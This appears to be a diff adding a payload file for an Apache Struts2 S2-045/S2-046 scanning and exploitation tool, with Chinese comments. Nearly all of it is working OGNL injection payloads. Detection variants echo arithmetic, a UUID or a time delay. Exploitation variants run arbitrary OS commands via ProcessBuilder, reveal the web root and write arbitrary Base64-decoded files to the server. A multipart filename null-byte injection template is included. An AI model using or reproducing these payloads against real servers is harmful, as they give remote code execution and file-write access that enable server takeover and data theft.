@@ -1,0 +1,30 @@
+# S2-045 / S2-046 Payload 仓库（供参考，实际检测由插件内部构造）
+# 说明：以下 payload 与 core/PayloadBuilder.java 中实际使用的保持一致
+
+# ==================== 检测类 Payload ====================
+
+# 数学运算验证（公开 POC 算式）：响应中出现 88866777 即存在
+# 注意：println 后必须 close() 刷新 Writer 缓冲，否则输出丢失
+math_validation: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}"
+
+# 指纹标记（UUID 回显）：响应中出现随机 UUID 即存在
+marker: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('{uuid}')).(#o.close())}"
+
+# 延时检测（无回显场景）：Thread.sleep(millis)，时间差判定
+delay: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Thread@sleep({millis}))}"
+
+# ==================== 利用类 Payload ====================
+
+# 命令执行（ProcessBuilder + 回显）：命令经 URL 编码 + URLDecoder 还原
+command_exec: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=@java.net.URLDecoder@decode('{cmd_enc}','UTF-8')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+# 获取 Web 根目录（ServletContext.getRealPath("/") 回显）
+get_webroot: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println(#req.getSession().getServletContext().getRealPath('/'))).(#resW.close())}"
+
+# 写文件（Base64 解码后写入，文件内容经 Base64 + 路径经 URL 编码）
+write_file: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wPath=@java.net.URLDecoder@decode('{path_enc}','UTF-8')).(#wData=@java.util.Base64@getDecoder().decode('{b64}')).(#sb=new java.lang.StringBuilder(#wPath)).(#fileOS=new java.io.FileOutputStream(#sb)).(#fileOS.write(#wData)).(#fileOS.close()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println('S2TOOL_WRITE_OK')).(#resW.close())}"
+
+# ==================== S2-046 filename 空字节注入（multipart 请求体） ====================
+# Content-Disposition: form-data; name="upload"; filename="%{OGNL}\x00"
+# 注意：filename 空字节检查需 commons-fileupload 1.3.3+（1.3.2 无检查，不触发）
+s2_046_filename: "Content-Disposition: form-data; name=\"upload\"; filename=\"%{{ognl}}\\u0000\""
